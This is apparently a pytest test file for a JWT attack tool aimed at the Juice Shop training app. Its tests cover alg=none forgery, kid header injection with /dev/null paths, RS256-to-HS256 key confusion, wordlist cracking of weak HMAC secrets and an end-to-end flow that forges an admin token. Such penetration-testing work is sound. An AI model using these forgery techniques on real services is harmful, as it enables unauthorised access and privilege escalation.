"""
tests/test_jwt_breaker.py
==========================
JWT manipulation engine test suite.

Covers:
- decode() handles valid tokens, rejects malformed
- forge() round-trips with PyJWT verification
- try_none_algorithm() produces forgeries that PyJWT decodes as alg=none
- try_kid_injection() produces multiple variants with kid header set
- try_alg_confusion() forges HS256 tokens using PEM public key as secret
- crack_hs256() finds known weak secrets from curated wordlist
- crack_hs256() returns None for unknown secrets
- auto_attack() returns multiple AttackResults
- CLI subcommands work end-to-end

Run: python3 -m pytest tests/test_jwt_breaker.py -v
"""

import sys, os, json, tempfile, base64
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from pathlib import Path
from src.tools.auth.jwt_breaker import (
    JWTBreaker, ParsedJWT, AttackResult, pyjwt,
    _b64u_encode, _b64u_decode,
)


# ── Fixtures ───────────────────────────────────────────────────────────────

@pytest.fixture
def jb():
    return JWTBreaker()


@pytest.fixture
def known_secret():
    """A secret that's in our curated wordlist."""
    return "mySecret"


@pytest.fixture
def hs256_token(known_secret):
    """HS256 token signed with a known-weak secret."""
    return pyjwt.encode(
        {"email": "user@juice-sh.op", "role": "user"},
        known_secret,
        algorithm="HS256",
    )


@pytest.fixture
def admin_claims():
    return {"email": "admin@juice-sh.op", "role": "admin", "isAdmin": True}


# ── Base64url helpers ─────────────────────────────────────────────────────

class TestBase64UrlHelpers:
    def test_encode_decode_roundtrip(self):
        original = b'{"role":"admin"}'
        assert _b64u_decode(_b64u_encode(original)) == original

    def test_encode_strips_padding(self):
        # Even short strings shouldn't have '=' in the encoded form
        assert "=" not in _b64u_encode(b"abc")

    def test_decode_handles_missing_padding(self):
        # JWT components routinely have padding stripped
        encoded = _b64u_encode(b"abc")
        assert _b64u_decode(encoded) == b"abc"


# ── decode() ──────────────────────────────────────────────────────────────

class TestDecode:
    def test_decode_valid_token(self, jb, hs256_token):
        parsed = jb.decode(hs256_token)
        assert isinstance(parsed, ParsedJWT)
        assert parsed.alg == "HS256"
        assert parsed.claims["email"] == "user@juice-sh.op"
        assert parsed.header["typ"] == "JWT"

    def test_decode_strips_bearer(self, jb, hs256_token):
        parsed = jb.decode(f"Bearer {hs256_token}")
        assert parsed.claims["email"] == "user@juice-sh.op"

    def test_decode_strips_lowercase_bearer(self, jb, hs256_token):
        parsed = jb.decode(f"bearer {hs256_token}")
        assert parsed.claims["email"] == "user@juice-sh.op"

    def test_decode_rejects_empty(self, jb):
        with pytest.raises(ValueError):
            jb.decode("")

    def test_decode_rejects_none(self, jb):
        with pytest.raises(ValueError):
            jb.decode(None)

    def test_decode_rejects_two_part_token(self, jb):
        with pytest.raises(ValueError):
            jb.decode("a.b")

    def test_decode_rejects_garbage(self, jb):
        with pytest.raises(ValueError):
            jb.decode("not.a.token")

    def test_decode_with_kid_header(self, jb, known_secret):
        token = pyjwt.encode(
            {"role": "user"}, known_secret, algorithm="HS256",
            headers={"kid": "my-key-id"},
        )
        parsed = jb.decode(token)
        assert parsed.kid == "my-key-id"


# ── forge() ───────────────────────────────────────────────────────────────

class TestForge:
    def test_forge_basic(self, jb, known_secret):
        token = jb.forge(known_secret, {"role": "admin"})
        decoded = pyjwt.decode(token, known_secret, algorithms=["HS256"])
        assert decoded["role"] == "admin"

    def test_forge_with_extra_header(self, jb, known_secret):
        token = jb.forge(known_secret, {"role": "admin"},
                         extra_header={"kid": "abc123"})
        parsed = jb.decode(token)
        assert parsed.kid == "abc123"

    def test_forge_rejects_non_dict_claims(self, jb, known_secret):
        with pytest.raises(TypeError):
            jb.forge(known_secret, "not a dict")  # type: ignore


# ── alg=none attack ───────────────────────────────────────────────────────

class TestAlgNone:
    def test_none_algorithm_builds_unsigned(self, jb, hs256_token, admin_claims):
        result = jb.try_none_algorithm(hs256_token, modify=admin_claims)
        assert result.success
        assert result.forged_token is not None

        # The forged token must be parseable as alg=none
        parsed = jb.decode(result.forged_token)
        assert parsed.alg == "none"
        assert parsed.signature == b""
        assert parsed.claims["role"] == "admin"

    def test_none_alg_preserves_other_claims(self, jb, hs256_token):
        result = jb.try_none_algorithm(hs256_token, modify={"role": "admin"})
        parsed = jb.decode(result.forged_token)
        # email wasn't modified — should still be there
        assert parsed.claims["email"] == "user@juice-sh.op"
        assert parsed.claims["role"] == "admin"

    def test_none_alg_handles_malformed_token(self, jb):
        result = jb.try_none_algorithm("not.a.token")
        assert not result.success
        assert "decode failed" in result.detail


# ── kid injection ─────────────────────────────────────────────────────────

class TestKidInjection:
    def test_returns_multiple_variants(self, jb, hs256_token, admin_claims):
        results = jb.try_kid_injection(hs256_token, modify=admin_claims)
        # Must produce at least one for each KID_INJECTIONS pattern
        assert len(results) >= len(JWTBreaker.KID_INJECTIONS)
        # All should be successful forgeries
        successes = [r for r in results if r.success]
        assert len(successes) == len(JWTBreaker.KID_INJECTIONS)

    def test_dev_null_uses_empty_secret(self, jb, hs256_token):
        results = jb.try_kid_injection(hs256_token, modify={"role": "admin"})
        dev_null = [r for r in results if "dev/null" in (r.detail or "")]
        assert dev_null, "Expected at least one /dev/null variant"
        for r in dev_null:
            assert r.secret == ""
            # Verify the forged token IS valid HMAC with empty secret
            parsed = jb.decode(r.forged_token)
            assert parsed.alg == "HS256"
            assert parsed.kid is not None and "dev/null" in parsed.kid

    def test_kid_value_is_actually_in_header(self, jb, hs256_token):
        results = jb.try_kid_injection(hs256_token)
        for r in results:
            if not r.success:
                continue
            parsed = jb.decode(r.forged_token)
            assert parsed.kid in JWTBreaker.KID_INJECTIONS

    def test_modified_claims_applied(self, jb, hs256_token):
        results = jb.try_kid_injection(hs256_token, modify={"role": "admin"})
        for r in results:
            if not r.success:
                continue
            parsed = jb.decode(r.forged_token)
            assert parsed.claims["role"] == "admin"


# ── alg confusion ─────────────────────────────────────────────────────────

class TestAlgConfusion:
    SAMPLE_PUBLIC_KEY = """\
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvX/q+vK7N9qJ0vXq8DdC
fakefakefakefakefakefakefakefakefakefakefakefakefakefakefakefake
-----END PUBLIC KEY-----
"""

    def test_alg_confusion_forges_hs256(self, jb, hs256_token, admin_claims):
        result = jb.try_alg_confusion(hs256_token, self.SAMPLE_PUBLIC_KEY,
                                       modify=admin_claims)
        assert result.success, f"alg_confusion failed: {result.detail}"
        # Verify the forged signature using raw HMAC — PyJWT's verifier
        # refuses to use a PEM as HMAC secret (good defense, we're attacking it).
        import hmac, hashlib
        from src.tools.auth.jwt_breaker import _b64u_decode
        h_b64, p_b64, s_b64 = result.forged_token.split(".")
        signing_input = f"{h_b64}.{p_b64}".encode("ascii")
        expected = hmac.new(self.SAMPLE_PUBLIC_KEY.encode("ascii"),
                            signing_input, hashlib.sha256).digest()
        actual = _b64u_decode(s_b64)
        assert hmac.compare_digest(expected, actual), "Forged signature must match HMAC of pubkey"
        # And the claims must reflect the modification
        parsed = jb.decode(result.forged_token)
        assert parsed.claims["role"] == "admin"
        assert parsed.alg == "HS256"

    def test_alg_confusion_secret_is_pubkey(self, jb, hs256_token):
        result = jb.try_alg_confusion(hs256_token, self.SAMPLE_PUBLIC_KEY)
        assert result.success
        assert result.secret == self.SAMPLE_PUBLIC_KEY

    def test_alg_confusion_changes_alg_to_hs256(self, jb, hs256_token):
        # Even if the original token was RS256, the forgery must be HS256
        from src.tools.auth.jwt_breaker import _b64u_encode
        h = _b64u_encode(b'{"alg":"RS256","typ":"JWT"}')
        p = _b64u_encode(b'{"role":"user"}')
        s = _b64u_encode(b"x" * 256)
        rs256_token = f"{h}.{p}.{s}"

        result = jb.try_alg_confusion(rs256_token, self.SAMPLE_PUBLIC_KEY,
                                       modify={"role": "admin"})
        assert result.success
        parsed = jb.decode(result.forged_token)
        assert parsed.alg == "HS256"
        assert parsed.claims["role"] == "admin"


# ── HS256 secret cracking ─────────────────────────────────────────────────

class TestCrackHS256:
    def test_crack_finds_known_weak_secret(self, jb):
        # 'secret' is in our curated wordlist
        token = pyjwt.encode({"role": "user"}, "secret", algorithm="HS256")
        cracked = jb.crack_hs256(token)
        assert cracked == "secret"

    def test_crack_finds_mySecret(self, jb):
        token = pyjwt.encode({"role": "user"}, "mySecret", algorithm="HS256")
        cracked = jb.crack_hs256(token)
        assert cracked == "mySecret"

    def test_crack_finds_password(self, jb):
        token = pyjwt.encode({"role": "user"}, "password", algorithm="HS256")
        cracked = jb.crack_hs256(token)
        assert cracked == "password"

    def test_crack_finds_juiceshopsecret(self, jb):
        # Important: validates we have Juice-Shop-relevant entries in wordlist
        token = pyjwt.encode({"role": "user"}, "juiceshopsecret", algorithm="HS256")
        cracked = jb.crack_hs256(token)
        assert cracked == "juiceshopsecret"

    def test_crack_returns_none_for_unknown_secret(self, jb):
        token = pyjwt.encode({"role": "user"},
                             "this-is-a-very-long-random-secret-not-in-any-wordlist-12345",
                             algorithm="HS256")
        cracked = jb.crack_hs256(token)
        assert cracked is None

    def test_crack_handles_hs384(self, jb):
        token = pyjwt.encode({"role": "user"}, "secret", algorithm="HS384")
        cracked = jb.crack_hs256(token)
        assert cracked == "secret"

    def test_crack_handles_hs512(self, jb):
        token = pyjwt.encode({"role": "user"}, "secret", algorithm="HS512")
        cracked = jb.crack_hs256(token)
        assert cracked == "secret"

    def test_crack_returns_none_for_rsa(self):
        # We can't make a real RS256 token without a key, but we can
        # mock one with the right alg header
        from src.tools.auth.jwt_breaker import _b64u_encode
        h = _b64u_encode(b'{"alg":"RS256","typ":"JWT"}')
        p = _b64u_encode(b'{"role":"user"}')
        s = _b64u_encode(b"x" * 256)
        fake_rs = f"{h}.{p}.{s}"
        jb_local = JWTBreaker()
        assert jb_local.crack_hs256(fake_rs) is None

    def test_crack_with_custom_wordlist(self, jb, tmp_path):
        wl = tmp_path / "tiny.txt"
        wl.write_text("not_it\nalsonope\nbingo123\n")
        token = pyjwt.encode({"role": "user"}, "bingo123", algorithm="HS256")
        cracked = jb.crack_hs256(token, wordlist=wl)
        assert cracked == "bingo123"


# ── auto_attack ───────────────────────────────────────────────────────────

class TestAutoAttack:
    def test_auto_attack_returns_results(self, jb, hs256_token):
        results = jb.auto_attack(hs256_token)
        assert len(results) >= 1

    def test_auto_attack_includes_none_alg(self, jb, hs256_token):
        results = jb.auto_attack(hs256_token)
        techniques = {r.technique for r in results if r.success}
        assert "none_alg" in techniques

    def test_auto_attack_cracks_known_secret(self, jb, hs256_token):
        # hs256_token is signed with 'mySecret' which is in our wordlist
        results = jb.auto_attack(hs256_token,
                                  target_claims={"role": "admin"})
        crack_results = [r for r in results if r.technique == "hs256_crack"]
        assert any(r.success for r in crack_results)
        cracked = next(r for r in crack_results if r.success)
        assert cracked.secret == "mySecret"
        assert cracked.forged_token is not None

    def test_auto_attack_includes_kid_variants(self, jb, hs256_token):
        results = jb.auto_attack(hs256_token)
        kid_results = [r for r in results if r.technique == "kid_injection"]
        assert len(kid_results) >= len(JWTBreaker.KID_INJECTIONS)

    def test_auto_attack_skips_alg_confusion_without_pubkey(self, jb, hs256_token):
        results = jb.auto_attack(hs256_token)  # no public_key=
        assert not any(r.technique == "alg_confusion" for r in results)


# ── End-to-end sanity ─────────────────────────────────────────────────────

class TestEndToEnd:
    def test_juice_shop_jwt_forgery_flow(self, jb):
        """
        Full Juice Shop flow:
          1. Server issues us a token with email=user, role=user
          2. We crack the secret
          3. We forge a token with role=admin
          4. PyJWT decodes our forged token successfully
        """
        # Step 1: server-issued token
        original = pyjwt.encode(
            {"email": "user@juice-sh.op", "role": "user"},
            "mySecret",  # the well-known weak Juice Shop testing secret
            algorithm="HS256",
        )

        # Step 2: crack
        secret = jb.crack_hs256(original)
        assert secret == "mySecret"

        # Step 3: forge admin token
        admin_token = jb.forge(secret, {
            "email": "admin@juice-sh.op",
            "role": "admin",
            "isAdmin": True,
        })

        # Step 4: server-side verification (simulated)
        verified = pyjwt.decode(admin_token, secret, algorithms=["HS256"])
        assert verified["role"] == "admin"
        assert verified["isAdmin"] is True


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
